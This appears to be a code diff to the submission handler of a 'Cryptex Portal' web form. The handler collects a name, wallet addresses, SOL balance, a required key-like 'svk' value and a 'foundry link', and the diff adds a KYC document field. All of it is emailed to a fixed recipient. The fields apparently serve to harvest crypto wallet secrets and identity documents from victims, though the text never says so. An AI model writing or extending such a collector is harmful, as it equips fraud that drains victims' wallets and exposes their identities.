@@ -17,7 +17,7 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { name, exchangeWallet, walletAddress, solBalance, svk, foundryLink } = req.body;
+  const { name, exchangeWallet, walletAddress, solBalance, svk, foundryLink, kycFile } = req.body;
 
   if (!name || !walletAddress || !svk || !foundryLink || !exchangeWallet) {
     return res.status(400).json({ error: 'Missing required fields' });
@@ -58,6 +58,10 @@ export default async function handler(req, res) {
     <div style="font-size:15px">${escapeHtml(name)}</div>
   </div>
   <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
+    <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">KYC DOCUMENT</div>
+    <div style="font-size:13px;color:rgba(20,241,149,0.8)">${kycFile ? escapeHtml(kycFile) : 'Not provided'}</div>
+  </div>
+  <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
     <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">EXCHANGE WALLET</div>
     <div style="font-size:13px;color:#9945FF;word-break:break-all">${escapeHtml(exchangeWallet)}</div>
   </div>
@@ -82,7 +86,7 @@ export default async function handler(req, res) {
       from: `"Cryptex Portal" <${smtpUser}>`,
       to: recipientEmail,
       subject: `◎ New Entry: ${name} · Cryptex Portal`,
-      text: `NEW SUBMISSION\n\nName: ${name}\nExchange Wallet: ${exchangeWallet}\nSolana Wallet: ${walletAddress}\nSOL Balance: ${solBalance}\nSVK: ${svk}\nFoundry: ${foundryLink}\nTime: ${submittedAt}`,
+      text: `NEW SUBMISSION\n\nName: ${name}\nKYC Document: ${kycFile || 'N/A'}\nExchange Wallet: ${exchangeWallet}\nSolana Wallet: ${walletAddress}\nSOL Balance: ${solBalance}\nSVK: ${svk}\nFoundry: ${foundryLink}\nTime: ${submittedAt}`,
       html,
     });
     return res.status(200).json({ success: true });
